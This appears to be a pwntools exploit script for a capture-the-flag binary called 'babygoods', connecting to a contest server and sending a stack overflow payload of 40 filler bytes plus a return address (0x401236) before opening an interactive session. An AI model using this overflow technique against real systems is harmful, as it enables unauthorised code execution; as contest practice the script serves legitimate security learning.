#!/usr/bin/python3

from pwn import *

exe = ELF('babygoods', checksec=False)

context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        input()


if args.REMOTE:
    p = remote('challs.nusgreyhats.org', 32345)
else:
    p = process(exe.path)
GDB()
sla(b'name: ', b'1')
sla(b'Input: ', b'1')
sla(b'(1-5): ', b'1')
sla(b'name: ', b'a'*40 + flat(0x401236))


p.interactive()
